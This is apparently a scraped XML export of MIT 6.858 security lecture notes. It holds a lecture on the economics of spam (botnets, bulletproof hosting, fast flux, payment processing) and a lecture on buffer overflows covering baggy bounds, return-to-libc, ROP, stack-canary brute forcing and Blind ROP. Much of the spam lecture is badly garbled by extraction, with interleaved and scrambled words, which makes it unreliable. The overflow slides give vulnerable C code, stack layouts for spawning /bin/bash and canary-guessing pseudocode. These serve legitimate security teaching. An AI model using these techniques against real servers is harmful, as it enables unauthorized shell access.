 Instead	&#13; of	&#13; hiring	&#13; someone	&#13; to	&#13; solve	&#13; the	&#13; CAPTCHA	&#13; on	&#13; another	&#13; site,	&#13; and	&#13; ask	&#13; a	&#13; normal	&#13; visitorattacker,	&#13; the
	&#13; 	&#13; attacke
Providers	&#13; can	&#13; implement	&#13; more	&#13; frequent	&#13; checks	&#13; for	&#13; spam	&#13; senders,	&#13; but	&#13; reto	&#13; solve	&#13; ir	&#13; can	&#13; r
t.	&#13; euse	&#13; the	&#13; 
users	&#13; may	&#13; 
o get	&#13; annoyed	&#13; if	&#13; the	&#13; checks	&#13; argular	&#13; 
Ex:	&#13; Gmail	&#13; lets	&#13; you	&#13; enable	&#13; two-you	&#13; open	&#13; Gmail	&#13; from	&#13; a	&#13; previously	&#13; unknown	&#13; machine,	&#13; Google	&#13; will	&#13; send	&#13; fae	&#13; too	&#13; fr
ctor	&#13; authentication.	&#13; In	&#13; this	&#13; scheme,	&#13; when	&#13; equent. 	&#13; 
	&#13; you	&#13; a	&#13; verification	&#13; code	&#13; via	&#13; SMS. 	&#13; 
Click
 	&#13; support:	&#13; 
1)the
 n,	&#13; th
register	&#13; a	&#13; domain	&#13; name.	&#13; e	&#13; user	&#13; contThe	&#13; 
actuser
s	&#13; t	&#13; contacts
he	&#13; associat	&#13; DN
ed	&#13; wS	&#13; to	&#13; tr
ebans
	&#13; server.	&#13; So,	&#13; tlate	&#13; a	&#13; hostname	&#13; into	&#13; an	&#13; IP	&#13; address;	&#13; 
he	&#13; spammer	&#13; needs	&#13; to:	&#13; 
2)run
	&#13; 3) run	&#13; 
	&#13; aa	&#13; 	&#13; DNSweb	&#13; 	&#13; 
server.server.
	&#13; 	&#13; 
Q:	&#13; Why	&#13; do	&#13; spammers	&#13; bother	&#13; with	&#13; domain	&#13; names?	&#13; 
 
ad
 d
A1:	&#13; Users	&#13; might	&#13; be	&#13; less	&#13; likely	&#13; to	&#13; click	&#13; on	&#13; a	&#13; resses	&#13; to	&#13; serve 	&#13; content?	&#13; Why	&#13; not	&#13;  just	&#13; use	&#13; raw	&#13; IP	&#13; 
A2:	&#13; A	&#13; stronger	&#13; reason	&#13; is	&#13; that	&#13; using	&#13; a	&#13; layer	&#13; of	&#13; indirection	&#13; makes	&#13; it	&#13; easier	&#13; to	&#13; keep	&#13; link	&#13; that	&#13; has	&#13; a	&#13; raw	&#13; IP	&#13; address	&#13; in	&#13; it?	&#13; 
the	&#13; c
oo
 nte
If	&#13; law	&#13; enforcement	&#13; dnt	&#13; server	&#13; alive. 	&#13; 
server,	&#13; but	&#13; the	&#13; server	&#13; eregist
is	&#13; stillers	&#13; t
	&#13; alive,	&#13; the	&#13; spammer	&#13; can	&#13; just	&#13; registerhe	&#13; domain	&#13; name	&#13; or	&#13; disables	&#13; the	&#13; DNS	&#13; 
	&#13; a	&#13; new	&#13; 
	&#13; 
 domain	&#13; name	&#13; and	&#13; create	&#13; a	&#13; new	&#13; DNS	&#13; server.	&#13; 
Spam	&#13; URLs	&#13; often	&#13; point	&#13; to	&#13; redirection	&#13; sites.	&#13; 
o 
o 
 Free	&#13; A	&#13; compromised	&#13; site	&#13; can	&#13; also	&#13; perform	&#13; a	&#13; redirect	&#13; to	&#13; the	&#13; spam	&#13; server.	&#13; redirectors	&#13; like	&#13; bit.ly	&#13; or	&#13; other	&#13; URL	&#13; shorte ners.	&#13; 
Redir
o ection	&#13; sites	&#13; ar
A	&#13; popular	&#13; site	&#13; is	&#13; extremely	&#13; useful	&#13; as	&#13; a	&#13; redirection	&#13; platform:	&#13; to	&#13; stop	&#13; e	&#13; useful	&#13; because	&#13; spam 	&#13; filtering	&#13; systems	&#13; may	&#13; blacklist	&#13; URLs.	&#13; 
 spam,	&#13; filtering	&#13; software	&#13; would	&#13; have	&#13; to	&#13; blacklist	&#13; a	&#13; popular	&#13; website! 	&#13; the	&#13; 
Spammers	&#13; sometimes	&#13; use	&#13; botnets	&#13; as	&#13; web	&#13; servers
o This	&#13; hides	&#13; the	&#13; IP	&#13; address	&#13; of	&#13; the	&#13; real	&#13; web	&#13; server;	&#13; 	&#13; or	&#13; prox
inies.
direct	&#13; 
	&#13; ion	&#13; once 	&#13; again!	&#13; 
In	&#13; some	&#13; cases,	&#13; a	&#13; single	&#13; affiliate	&#13; provider	&#13; will	&#13; run	&#13; some	&#13; or	&#13; all	&#13; of	&#13; these	&#13; services.	&#13; 
 
 Q:	&#13; CA:	&#13; In	&#13; theory,	&#13; yes,	&#13; but	&#13; it	&#13; can	&#13; be	&#13; hard	&#13; to	&#13; take	&#13; down	&#13; the	&#13; entire	&#13; organization.	&#13; Also,	&#13; an't	&#13; law	&#13; enforcement	&#13; just	&#13; take	&#13; down	&#13; the	&#13; affiliate	&#13; program?	&#13; 
there	&#13; are	&#13; a	&#13; non -trivial	&#13; number	&#13; of	&#13; affiliate	&#13; programs.	&#13; 
	&#13; 
5</text>
        </slide>
        <slide>
          <slideno>6</slideno>
          <text>A:	&#13; Credit	&#13; card	&#13; companies	&#13; track	&#13; the	&#13; number	&#13; of	&#13; "chargeback"	&#13; requests	&#13; (i.e.,	&#13; the	&#13; 
number	&#13; of	&#13; times	&#13; that	&#13; customers	&#13; ask	&#13; their	&#13; credit	&#13; card	&#13; company	&#13; to	&#13; return	&#13; funds	&#13; 
involved	&#13; in	&#13; a
o Credit	&#13; card	&#13; companies	&#13; issue	&#13; penalties	&#13; if	&#13; the	&#13; number	&#13; of	&#13; chargeback	&#13; 	&#13; broken	&#13; transaction). 	&#13; 
transactions	&#13; is	&#13; too	&#13; high	&#13; (&gt;1%).
	&#13; o 
notSo,	&#13; it's	&#13; not	&#13; sustainable	&#13; for 	&#13; a	&#13; spammer	&#13; to	&#13; frequently	&#13; charge	&#13; customers	&#13; but	&#13; 	&#13; 
	&#13; ship	&#13; goods,	&#13; particularly	&#13; if	&#13; .	&#13; .	&#13; . 	&#13; 
Only	&#13; a	&#13; f
paper
 ]	&#13; ew	&#13; banks	&#13; are	&#13; willing	&#13; to	&#13; interact 	&#13; with	&#13; spammers!	&#13; [Table	&#13; V,	&#13; Figure	&#13; 5	&#13; in	&#13; the	&#13; 
 CCS
So,	&#13; an	&#13; effective	&#13; spam	&#13; pre'12	&#13; paper:	&#13; Only	&#13; 30	&#13; acqu
ventirin
iong	&#13; 
	&#13; b
tea
cn
o hks	&#13; 
qseen	&#13;  2	&#13; years!
banksni ue	&#13; isover	&#13; 
.	&#13; Why?	&#13; 	&#13; to	&#13; focus	&#13; on	&#13; th	&#13; 
ose	&#13; small	&#13; number	&#13; of	&#13; 
 High	&#13; cost	&#13; to	&#13; sw
But	&#13; who 
o Fin
at	&#13; can	&#13; weancial	&#13; 
	&#13; actually	&#13; drisk	&#13; init
	&#13; swch	&#13; 
itba
chinnks.
g	&#13; 
.	&#13; 
o Try	&#13; tConvin
o	&#13; convince	&#13; tce	&#13; issuing	&#13; 
hese	&#13; bbao
n?
k	&#13; 
s	&#13; to	&#13; blacklist 	&#13; these	&#13; acquiring	&#13; banks? 	&#13; 
tr
even	&#13; clicky:	&#13; "Danks	&#13; to	&#13; stop	&#13; dealing	&#13; with	&#13; spammers?	&#13; This	&#13; may	&#13; be	&#13; 
the	&#13; c
 ountrear	&#13; tue
ha	&#13; to
t	&#13; i
	&#13; tnc
he	&#13; saongr
leui
	&#13; of	&#13; such	&#13; goods	&#13; [like	&#13; pharmaceuticals]	&#13; ties	&#13; in	&#13; intellectual	&#13; property	&#13; protection,	&#13; it	&#13; is	&#13; not	&#13; 
 -Spamming	&#13; is	&#13; ies	&#13; in	&#13; which
dist	&#13; su
ach	&#13; 
stefubank
l,	&#13; bs	&#13; 
ua
tre	&#13; 
	&#13; it'sloca
-For	&#13; example,	&#13; some	&#13; affiliate	&#13; customers	&#13; might	&#13; not	&#13; come	&#13; from	&#13; 	&#13; not	&#13; always	&#13; criminal.	&#13; ted."	&#13; [Section	&#13; IV.D]is	&#13; il
	&#13; legal	&#13; in	&#13; 
	&#13; spam ---they	&#13; might	&#13; come	&#13; from	&#13; legitimate	&#13; Google	&#13; searches!	&#13; 
Since	&#13; this	&#13; paper
 	&#13; was	&#13; published,	&#13; credit	&#13; card	&#13; networ
complaints	&#13; about	&#13; VAfter	&#13; the	&#13; paper	&#13; came	&#13; out,	&#13; some	&#13; pharmacy	&#13; and
isa	&#13; [the	&#13; authors	&#13; used	&#13; Visa	&#13; cards	&#13; to	&#13; make	&#13; their	&#13; softks	&#13; have	&#13; taken	&#13; some	&#13; action.	&#13; 
ware	&#13; vendors	&#13; l
	&#13; spam	&#13; odged	&#13; 
 pur
In	&#13; response,	&#13; V
ochas
 es].	&#13; 
All	&#13; pharmaceuticals	&#13; sales	&#13; are	&#13; isa	&#13; made	&#13; some	&#13; policy	&#13; changes:
now	&#13; labeled	&#13; high	&#13; 
acquirer	&#13; for	&#13; high-risk	&#13; merchants,	&#13; the	&#13; bank	&#13; is	&#13; more	&#13; strictly	&#13; regulated-risk;	&#13; if	&#13; a	&#13; bank	&#13; acts 	&#13; as	&#13; an	&#13; 
o the	&#13; bank	&#13; needs	&#13; to	&#13; engage	&#13; in	&#13; a	&#13; (e.g.,	&#13; 
o saVisa
les	&#13; 's	&#13; 
ofop
	&#13; drugs	&#13; and	&#13; trademark-erating	&#13; guidelines	&#13; now	&#13; risk
	&#13; ex-management	&#13; program).	&#13; 
infringing	&#13; goods.plicitly 	&#13; enumerate	&#13; and	&#13; forbid	&#13; illegal	&#13; 
The	&#13; new	&#13; language	&#13; allows	&#13; Visa	&#13; to 	&#13; aggressively	&#13; is	&#13; 
o acquiring	&#13; banks.	&#13; sue	&#13; fines	&#13; against 	&#13; 
Some	&#13; affiliate	&#13; programs	&#13; responded
photo	&#13; ID
However,	&#13; (the	&#13; goal	&#13; was
	&#13; this	&#13; hurts	&#13; sal	&#13; to	&#13; f
	&#13; info.es,ilter	&#13; out	&#13; test	&#13; buys	&#13; from	&#13; security	&#13; researchers).	&#13; 	&#13; by	&#13; requiring	&#13; customers	&#13; to	&#13; submit	&#13; a	&#13; 
	&#13; 	&#13; since 	&#13; customers	&#13; are	&#13; reluctant	&#13; to	&#13; give 	&#13; their	&#13; ID	&#13; 
Does	&#13; this	&#13; paper	&#13; raise	&#13; ethical	&#13; concerns?	&#13; Are	&#13; the	&#13; authors	&#13; supporting	&#13; the	&#13; spammers	&#13; by	&#13; 
purchasing	&#13; their	&#13; goods? 	&#13; 
	&#13; 
7</text>
        </slide>
        <slide>
          <slideno>0</slideno>
          <text>6.858	&#13; Lecture	&#13; 23 	&#13; 
THE	&#13; ECONOMICS	&#13; OF	&#13; SPAM 	&#13; 
Administrivia:	&#13; 
 
 DonFina
o't
l
 	&#13; 	&#13; 
pforg
rojectet	&#13; t
pl
 	&#13; o	&#13; 
resenfil 	&#13; ou
tt
o3	&#13; minutes	&#13; per	&#13; group.	&#13; a	&#13; 
tt
ionhe	&#13; cou
s	&#13; schedurse	&#13; eva
le.l
	&#13; uation! 	&#13; 
o 
 We	&#13; tentati
Final	&#13; projLet
ect	&#13; us	&#13; 
	&#13; checkknowve
	&#13; if	&#13; ly
you	&#13; plan	&#13; to
r	&#13; grou	&#13; do
p	&#13; a	&#13; 2
	&#13; -hour	&#13; session
-off:	&#13; Sign	&#13; up	&#13; for	&#13; a	&#13; TA	&#13; slot.	&#13; has	&#13; a	&#13; hard 	&#13; conflict	&#13; until	&#13; 1pm.	&#13; 
	&#13; with	&#13; 12:30pm --1pm.	&#13; 
	&#13; 
Up	&#13; t
overfl
 o	&#13; t
owhis	&#13; point
s,	&#13; the 	&#13; same-,	&#13; we've	&#13; deal
origin	&#13; polt	&#13; with	&#13; the	&#13; *technical* 	&#13; aspects	&#13; of	&#13; security	&#13; (buffer	&#13; 
 threat	&#13; model,	&#13; and	&#13; then	&#13; try	&#13; to	&#13; make	&#13; our	&#13; system	&#13; robust	&#13; against	&#13; that	&#13; threat	&#13; model.	&#13; Primary	&#13; concern:	&#13; How	&#13; can	&#13; an	&#13; adversary	&#13; compromise	&#13; icy,	&#13; Tor,	&#13; etc). 	&#13; 
a	&#13; sys tem?	&#13; We	&#13; devise	&#13; a	&#13; 
An	&#13; alternate	&#13; perspective:	&#13; *Why*	&#13; is	&#13; the	&#13; attacker
policies
o ?	&#13; 	&#13; trying	&#13; to	&#13; subvert	&#13; our	&#13; security	&#13; 
Some	&#13; types	&#13; of	&#13; attacks	&#13; are	&#13; done	&#13; for	&#13; ideological	&#13; prof	&#13; attacks,	&#13; money	&#13; is	&#13; not	&#13; primary	&#13; motivator.	&#13; otes
 t	&#13; by	&#13; citizens; 	&#13; censorship	&#13; by	&#13; governments,	&#13; Stuxnet).	&#13; Forreasons	&#13; (e.g.,	&#13; pol
	&#13; thit
eica
se	&#13; kil	&#13; 
nds	&#13; 
 It's	&#13; hard	&#13; to	&#13; make	&#13; these	&#13; attacks	&#13; more	&#13; "making	&#13; computers	&#13; more	&#13; secure."	&#13; difficult,	&#13; other	&#13; than	&#13; generally	&#13; 
Economic	&#13; penalties	&#13; would	&#13; likely	&#13; after	&#13; crime	&#13; was	&#13; detected.	&#13; However,	&#13; computers	&#13; and	&#13; networks	&#13; involve	&#13; deterrence,	&#13; i.e.,	&#13; penalties 	&#13; 
currently 	&#13; have	&#13; poor	&#13; accountability.	&#13; Ex:	&#13; Where 	&#13; did	&#13; Stuxnet	&#13; come	&#13; 
It	&#13; takes	&#13; money	&#13; to	&#13; make	&#13; money!	&#13; o from?	&#13; We	&#13; have	&#13; some	&#13; And	&#13; which	&#13; court	&#13; would	&#13; we	&#13; good	&#13; ideas,	&#13; but	&#13; could	&#13; we	&#13; win	&#13; a	&#13; case
go	&#13; to?	&#13; 	&#13; in	&#13; court?	&#13; 
 Howmotivations	&#13; (e.g.,	&#13; ever,	&#13; many	&#13; kinds	&#13; of	&#13; computer	&#13; crime	&#13; *are*	&#13; driven	&#13; by	&#13; economic	&#13; 
o state -sponsored	&#13; industrial	&#13; espionage; 	&#13; spam).	&#13; 
o An	&#13; attacker	&#13; needs	&#13; to	&#13; assemble	&#13; infrastructure	&#13; 
Perhaps	&#13; we	&#13; can	&#13; deter	&#13; attackers	&#13; by	&#13; making	&#13; machines	&#13; to	&#13; launch	&#13; attacks,	&#13; banks	&#13; to	&#13; handle
th	&#13; i
ellito
c	&#13; s
it	&#13; fuppo
inancrt	&#13; an	&#13; attack.	&#13; Ex:	&#13; 
high? 	&#13; Ex:	&#13; Spammers	&#13; will	&#13; stop	&#13; sending	&#13; spam	&#13; if	&#13; it	&#13; becomes	&#13; unprofitable!ir	&#13; infrastrucial
tur	&#13; trans
e	&#13; coac
ststi
	&#13; toons
o.
	&#13; 	&#13; 
	&#13; 	&#13; 
For	&#13; component.	&#13; 
 today's	&#13; lecture,	&#13; we'll	&#13; focus	&#13; on	&#13; attacks	&#13; that 	&#13; do	&#13; involve	&#13; a	&#13; significant	&#13; economic	&#13; 
Ex:	&#13; In	&#13; C
communications	&#13; hina,	&#13; spammers	&#13; often	&#13; hire	&#13; "text-message	&#13; 
between	&#13; cell	&#13; phonecars."	&#13; The	&#13; cars	&#13; intercept	&#13; 
send	&#13; 200,000	&#13; messages	&#13; a	&#13; day!	&#13; phone	&#13; numbers,	&#13; and	&#13; then	&#13; send	&#13; spam	&#13; messages	&#13; to	&#13; those	&#13; numbers.	&#13; One	&#13; s	&#13; and	&#13; cell	&#13; phone	&#13; towers. 	&#13; The	&#13; cars	&#13; discover	&#13; 
o car	&#13; can	&#13; 
	&#13; o 
o Cost
Profit	&#13; of	&#13; 
	&#13; per	&#13; day:	&#13; ~interception	&#13; device:	&#13; ~$1,600 	&#13; 
Fines	&#13; for	&#13; getting	&#13; $1,600
caught	&#13; 
:	&#13; &lt;	&#13; $5,000 	&#13; 
1</text>
        </slide>
        <slide>
          <slideno>7</slideno>
          <text>Some	&#13; companies	&#13; have	&#13; launched	&#13; "hack-back"	&#13; campaigns	&#13; 
int
 el
Ex:	&#13; In	&#13; 2013,	&#13; Microsoft,	&#13; American	&#13; Express,	&#13; PayPal,	&#13; lectual	&#13; property, 	&#13; or	&#13; to	&#13; stop	&#13; botnets	&#13; involving	&#13; their	&#13; machines.	&#13; to	&#13; retaliate	&#13; against	&#13; theft	&#13; of	&#13; 
tne sofand
 companies	&#13; took	&#13; down	&#13; a	&#13; large	&#13; 
they	&#13; should	&#13; patch	&#13; their	&#13; machines.	&#13; bo t.	&#13; Micro t	&#13; then	&#13; to	&#13; a	&#13; bunch
ld	&#13; the	&#13; af	&#13; o
fef
c	&#13; o
teth
de
	&#13; usr	&#13; 
ers	&#13; that	&#13; 
Increasingly,	&#13; companies	&#13; are	&#13; using	&#13; novel	&#13; legal	&#13; arguments	&#13; to	&#13; take	&#13; action	&#13; against	&#13; Microsoft's	&#13; legal	&#13; reasoning:	&#13;  Botnets	&#13; were	&#13; violating 	&#13; Microsoft	&#13; trademarks.	&#13; 
	&#13; botnets	&#13; .	&#13; .	&#13; .	&#13; is	&#13; this	&#13; a	&#13; good	&#13; idea? 	&#13; 
Refer
 
  http://css.csail.mit.edu/6.858/2013/readings/captcha-http://css.csail.mit.edence: 	&#13; 
u/6.858/2013/readings/pricelessecon.pdf
 http://css.csail.mit.edu/6.858/2013/readings/pharmaleaks.pdf	&#13; .pdf	&#13; [CCS'1	&#13; 
2]	&#13; 
 http://www.usenix.org/media/events/atc11/tech/videos/savage.mp4	&#13; 
	&#13; http://research.microsoft.com/pubs/167719/whyfromnigeria.pdf	&#13; 
8</text>
        </slide>
        <slide>
          <slideno>3</slideno>
          <text>It's	&#13; difficult	&#13; to	&#13; prevent	&#13; bot	&#13; machines	&#13; from	&#13; sending	&#13; spam	&#13; ---	&#13; there	&#13; may	&#13; be	&#13; 
	&#13; millions	&#13; of	&#13; bot	&#13; IPs!	&#13; 
H
 
 ow	&#13; much	&#13; does	&#13; it	&#13; cost	&#13; to	&#13; get	&#13; your	&#13; malware	&#13; installed	&#13; 
Price	&#13; per	&#13; host:	&#13; ~$0.10	&#13; for	&#13; US	&#13; hosts,	&#13; ~$0.01	&#13; for 	&#13; hosts	&#13; in	&#13; Asia.	&#13; on	&#13; end -hosts?	&#13; 
	&#13; Seems	&#13; hard	&#13; to	&#13; prevent;	&#13; many	&#13; users	&#13; will	&#13; happily	&#13; run	&#13; arbitrary	&#13; executables. 	&#13; 
What	&#13; does	&#13; the	&#13; command	&#13; and	&#13; control	&#13; archi
 
 Cen"bullettral
-ized	&#13; C&amp;C	&#13; infrastructure:	&#13; adversate
ry	&#13; ctur
needse	&#13; lo
	&#13; ok	&#13; like?	&#13; 
proof"	&#13; hosting	&#13; (i.e.,	&#13; a	&#13; host	&#13; that	&#13; will 	&#13; refuse	&#13; takedown	&#13; requests	&#13; from	&#13; banks,	&#13; 
 legal	&#13; authorities).	&#13; 
What	&#13; too 
o Bulle
	&#13; do	&#13; ift
	&#13; h-proof	&#13; hosts	&#13; charge	&#13; a	&#13; risk	&#13; premium.	&#13; 
Adversary	&#13; can	&#13; use	&#13; DNS	&#13; to	&#13; redirect.	&#13; Also,	&#13; osting	&#13; service	&#13; is	&#13; taken	&#13;  down?	&#13; 
using	&#13; "fast	&#13; flux"	&#13; techniques
hostname.	&#13; attacke
 r	&#13; can	&#13; rapidly	&#13; change	&#13; the	&#13; IP	&#13; address	&#13; that	&#13; is 	&#13; associated	&#13; with	&#13; a	&#13; ,	&#13; the	&#13; 
Attacker	&#13; creates	&#13; a	&#13; list	&#13; of	&#13; server	&#13; IP	&#13; addresses	&#13; (there	&#13; may	&#13; be	&#13; 
o hundreds	&#13; or
hostname	&#13; for	&#13; a	&#13; short	&#13; period	&#13; thousands	&#13; of	&#13; IP
	&#13; of	&#13; time	&#13; (e.g.,	&#13; 300	&#13; seconds).	&#13; s);	&#13; atta cker	&#13; binds	&#13; each	&#13; one	&#13; to	&#13; the	&#13; 
How
 	&#13; hard	&#13; is	&#13; it	&#13; to	&#13; take	&#13; down	&#13; botnet's	&#13; 
 server.Can	&#13; take	&#13; down	&#13; either	&#13; domain's	&#13; registration,	&#13; or	&#13; the	&#13; domain's	&#13; DNS	&#13; DNS	&#13; domain	&#13; name?	&#13; 
Adversary	&#13; can	&#13; use	&#13; domain	&#13; flux,	&#13; span	&#13; many	&#13; 
 	&#13; 
 regHarder	&#13; 
istrat
rs!o	&#13; t
	&#13; ake	&#13; down:	&#13; requires 	&#13; coordinatsepa
ion	&#13; brate	&#13; regist
etween	&#13; rars. 	&#13; 
 Ha
enoughppened	&#13; 
	&#13; for	&#13; Conficker:	&#13; it	&#13; was	&#13; significant/important	&#13; 
Decen
o tra
Allows	&#13; bot	&#13; master	&#13; to	&#13; operate	&#13; fewer	&#13; or	&#13; nolized	&#13; C&amp;C	&#13; infrastructure:	&#13; peer -to-peer 	&#13; networ
	&#13; 	&#13; servers;	&#13; ks.
ha	&#13; 
rd	&#13; to	&#13; take	&#13; down.	&#13; 
C
 ompromised	&#13; webmail	&#13; accounts	&#13; can	&#13; also	&#13; be	&#13; used	&#13; to	&#13; send	&#13; spam.	&#13; 
 V
etery	&#13; effective	&#13; delivery	&#13; mechanism:	&#13; everyone	&#13; accepts	&#13; email	&#13; from	&#13; Yahoo,	&#13; Gmail,	&#13; 
Webmail	&#13; providers	&#13; are	&#13; motivated	&#13; to	&#13; prevent	&#13; accounts	&#13; from	&#13; being	&#13; compromised.	&#13; c.	&#13; 
o 
o If
may	&#13; be	&#13; marked	&#13; as	&#13; spam!	&#13; 	&#13; the	&#13; provider	&#13; doesn't	&#13; prevent	&#13; spam,	&#13; then	&#13; *all*	&#13; mail	&#13; from	&#13; that	&#13; provider	&#13; 
 The	&#13; provider	&#13; monetizes	&#13; the	&#13; service	&#13; using	&#13; 
How	&#13; do	&#13; providers	&#13; detect	&#13; spam?	&#13; 
o users	&#13; to	&#13; click	&#13; on	&#13; ads.	&#13; ads,	&#13; so	&#13; the	&#13; provider	&#13; needs	&#13; real	&#13; 
o Monitor	&#13; messages	&#13; being	&#13; sent	&#13; by	&#13; each	&#13; account,	&#13; For	&#13; suspicious	&#13; messages	&#13; and	&#13; initial
C	&#13; signup/first	&#13; few	&#13; msgs,	&#13; use	&#13; a	&#13; detect	&#13; suspicious	&#13; patterns. 	&#13; 
 itAPTC
---thisH
	&#13; sA:	&#13; present	&#13; the	&#13; user	&#13; with	&#13; an	&#13; image/sound,	&#13; 
hould	&#13; be 	&#13; easy	&#13; for	&#13; a	&#13; human,	&#13; but	&#13; hard	&#13; for	&#13; a	&#13; computer.	&#13; ask	&#13; user	&#13; to	&#13; transcribe	&#13; 
How	&#13; hard	&#13; is	&#13; it	&#13; to	&#13; get	&#13; a	&#13; compromised	&#13; webmail	&#13; 
o account?	&#13; 
Price	&#13; per	&#13; account:	&#13; ~
$0.01-0.05	&#13; per	&#13; account	&#13; on	&#13; Yahoo,	&#13; Gmail,	&#13; Hotmail,	&#13; etc.	&#13; 
4</text>
        </slide>
      </slides>
      <videos>
        <video>
          <video_url>https://ocw.mit.edu/courses/6-858-computer-systems-security-fall-2014/resources/lecture-8-web-security-model/</video_url>
          <video_title>Lecture 8: Web Security Model</video_title>
          <transcript/>
        </video>
      </videos>
    </lecture>
    <lecture>
      <lecture_title>Buffer Overflow Exploits and Defenses (PDF)</lecture_title>
      <lecture_pdf_url>https://ocw.mit.edu/courses/6-858-computer-systems-security-fall-2014/resources/mit6_858f14_lec3/</lecture_pdf_url>
      <lectureno>3</lectureno>
      <slides>
        <slide>
          <slideno>0</slideno>
          <text>6.858 Lecture 3
Baggy bounds continued:
Example code (assume that slot_size=16)
char *p = malloc(44); 
//Note that the nearest power of 2 (i.e., 
//64 bytes) are allocated. So, there are 
//64/(slot_size) = 4 bounds table entries //that are set to log_2(64) = 6. 
char *q = p + 60; 
//This access is ok: It's past p's object //size of 44, but still within the baggy 
//bounds of 64.
 
char *r = q + 16; //ERROR: r is now at an offset of 60+16=76  
//from p. This means that r is (76-64)=12
 
//beyond the end of p. This is more than //half a slot away, so baggy bounds will 
//raise an error. char *s = q + 8; 
//s is now at an offset of 60+8=68 from p. 
//So, s is only 4 bytes beyond the baggy //bounds, which is less than half a slot 
//away. No error is raised, but the OOB 
//high-order bit is set in s, so that s //cannot be derefernced. 
char *t = s - 32; 
//t is now back inside the bounds, so 
//the OOB bit is cleared. 
For OOB pointers, the	&#13; high	&#13; bit is set (if OOB within half	&#13; a slot).
 Typically,	&#13; OS	&#13; kernel lives	&#13; in upper half,	&#13; protects itself via paging	&#13; hardware.
 Q:
Why	&#13; half a slot	&#13; for out -of-bounds?
So what's the answer to the homework
problem
char *p = malloc(256); 
char *q = p + 256; 
char ch = *q; //Does this raise an exception? 
//Hint: How big is the baggy bound for p? 
Does baggy bounds checking have to instrument *every* memory
address
computation and access? No: static analysis can prove that some addresses are
always safe
to use. However,	&#13; some address calculations are "unsafe" in the sense
1</text>
        </slide>
        <slide>
          <slideno>6</slideno>
          <text>These kinds	&#13; of attacks	&#13; are	&#13; called	&#13; return -oriented	&#13; programming, o r	&#13; ROP.	&#13; To
understand how ROP works, let's examine a simple C program that has a securit
vulnerability . 
void run_shell(){ 
system("/bin/bash"); 
}  
void process_msg(){ 
char buf[128]; 
gets(buf); 
}  
Let's imagine that the system does not use ASLR or stack canaries, but it does use
DEP. process_msg() has an obvious buffe
r overflow,	&#13; but the attacker can't	&#13; use this
overflow to execute shellcode in buf, since DEP makes the stack non-executable.	&#13; 
However, that run_shell()	&#13; function looks tempting . . . how can the attacker execute
it?
1) Attacker	&#13; disassembles the program and figures out where the starting	&#13; address of 
run_shell().
2) The	&#13; attacker	&#13; launches	&#13; th buffer	&#13; overflow,	&#13; and overwrites	&#13; the	&#13; return	&#13; address	&#13; of 
process_msg() with the address of run_shell(). Boom! The attacker now has 
acce
ss to a shell	&#13; which runs with the privileges of the application. 
+------------------+  
entry %ebp ----&gt; | .. prev frame .. | 
| | 
| | 
+------------------+  
entry %esp ----&gt; | return address | ^ &lt;--Gets overwritten  
+------------------+ |  
with address of  
new %ebp ------&gt; | saved %ebp | | run_shell() 
 +------------------+ | 
| buf[127] | |
 
| ... | | 
| buf[0] | | 
new %esp ------&gt; +------------------
+  
That's	&#13; a straightforward	&#13; extension	&#13; of the	&#13; buffer	&#13; overflows	&#13; that we've already looked
at.
But how can we pass arguments to the function that we're jumping to?
char *bash_path = "/bin/bash";  
void run_cmd(){  
7</text>
        </slide>
        <slide>
          <slideno>7</slideno>
          <text>system("/something/boring"); 
}  
void process_msg(){ 
char buf[128];  
gets(buf); 
}  
In this case, the argument that we want to
pass to is already located in the progra
code. There's also a preexisting call to system(), but that	&#13; call	&#13; is
n'tpassing	&#13; the
argument that we want.
We know that system() must be getting linked to our program. So, using our trust
friend gdb,	&#13; we	&#13; can	&#13; find where the system() function is
located, and where bash_path
is located.
To call system() with the bash_path argument, we have to set	&#13; up the stack	&#13; in	&#13; the
way that
system() expects when we jump to it. Right after we jump to system()
system() expects this to be on the stack:
| ... | 
+------------------+  
| argument | The system() argument. 
+------------------+  
%esp ----&gt; | 
return addr | Where system() should 
+------------------+  ret after it has  
finished.  
So, the buffer overflow	&#13; needs to set up a
stack that
looks like this:
 +------------------+  
entry %ebp ----&gt; | .. prev frame .. |
 
| | 
| | 
| - - - - - - - - | ^  
| | |Address of bash_path  
+ - - - - - - - - | |  
| | |Junk return addr for  
+------------------+ |  system() 
entry %esp ----&gt; | return address 
| |Address of system() 
+------------------+ |  
new %ebp ------&gt; |  saved %ebp | |Junk 
+------------------+ | | buf[127] | |  
| ... 
| |Junk 
| buf[0] | | 
new %esp ------&gt; +------------------+ |
  
8</text>
        </slide>
        <slide>
          <slideno>10</slideno>
          <text>char canary[8]; 
for(int i = 1; i &lt;= 8; i++){ //For each canary byte 
for(char c = 0; c &lt; 256; c++){  //guess the value. canary[i-1] = c; server_crashed = try_i_byte_overflow(i, canary); 
if(!server_crashed){ 
//We've discovered i-th byte of the 
//the canary! 
break; 
} 
} 
} //At this point we have the canary, but remember that the 
//attack assumes that the server uses the same canary after 
//a crash.  
Guessing the	&#13; correct value	&#13; for a b
yte	&#13; takes	&#13; 128 guesses on average,	&#13; so on	&#13; a 32 -bit	&#13; 
system, we
only need 4*128=512 guesses to determine the canary (on a 64-bit	&#13; 
system, we need 8*128=1024).
	 Much faster than	&#13; brute force attacks on	&#13; the canary (2^15 or 2^27 expected 
guesses on 32/64 bit systems with
16/28 bits of ASLR randomness).
 Brute force attacks can use the usleep(16) probe	&#13; that we discussed earlier. 
Ca
nary	&#13; reading can be	&#13; extended	&#13; to	&#13; reading arbitrary	&#13; values that the	&#13; buffer	&#13; overflow
can overwrite!
So, we've discussed how we can defeat randomized canaries if canaries	&#13; are	&#13; not
changed when	&#13; a server regenerates. We'v
e also shown	&#13; how	&#13; to use gdb	&#13; and gadgets
to execute preexisting functions in the program using arguments that	&#13; the attacker
controls.	&#13; But what if the	&#13; server DOES use ASLR? This prevents you from usin
offline	&#13; analysis to find where the preexisting	&#13; functions are?
This is what the	&#13; paper	&#13; for today's	&#13; lecture	&#13; discussed. That paper assumed that we're
using	&#13; a 64-bit	&#13; machine, so that's what
we'll assume in this lecture from now on. For
the purposes of this discussion, the main change is that function arguments are now
passed in registers	&#13; instead	&#13; of on the	&#13; stack.
Blind	&#13; Return -oriented	&#13; Programming	&#13; 
STEP 1: Find a stop gadget
A stop gadget is
a return address that points to code
that will hang the program, but
not crash	&#13; it. Once the attacker can defeat	&#13; canaries,	&#13; he can overwrite the overflown	&#13; 
function's	&#13; return	&#13; address	&#13; and	&#13; start guessing locations for a sto p	&#13; gadget.	&#13; If the client
